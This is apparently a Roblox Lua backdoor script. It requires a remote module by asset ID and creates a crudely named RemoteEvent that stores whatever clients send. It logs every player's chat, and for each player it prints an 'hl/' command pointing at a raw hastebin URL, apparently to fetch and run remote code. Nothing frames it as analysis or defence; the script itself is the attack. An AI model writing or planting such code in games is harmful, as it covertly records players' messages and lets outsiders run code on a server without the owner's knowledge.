--Feel free to probe this with fiddler: require(382739820)


function Shortner(X)
    if not (string.lower(type(X))=='string') then
        return nil;
    end;
    local NL = 0;
    for i = 1,string.len(X) do
        NL = i;
    end;
    for _, players in pairs (game:GetService('Players'):GetPlayers()) do
        if (string.sub(string.lower(players.Name),1,NL)==(string.lower(X))) then
            return players;
        end;
    end;
    return nil;
end

if game.Lighting:FindFirstChild("BigCocks") then
game.Lighting:FindFirstChild("BigCocks"):remove()
end

local a = Instance.new("RemoteEvent",game.Lighting)

a.Name = "BigCocks"

a.OnServerEvent:connect(function(plr, args)
    print(plr.Name..": "..args)
    local string = Instance.new("StringValue", game.Lighting)
    string.Name = plr.Name
    string.Value = args
end)



for _, v in pairs(game.Players:GetChildren()) do
    print("hl/http://www.hastebin.com/raw/mobumesoti",v.Name)
    v.Chatted:connect(function(msg)
        warn(v.Name..": "..msg)
    end)
end

game.Players.PlayerAdded:connect(function(Player)
    wait(3)
    print("hl/http://www.hastebin.com/raw/mobumesoti",Player.Name)
    Player.Chatted:connect(function(message)
        warn(Player.Name..": "..message)
    end)
end)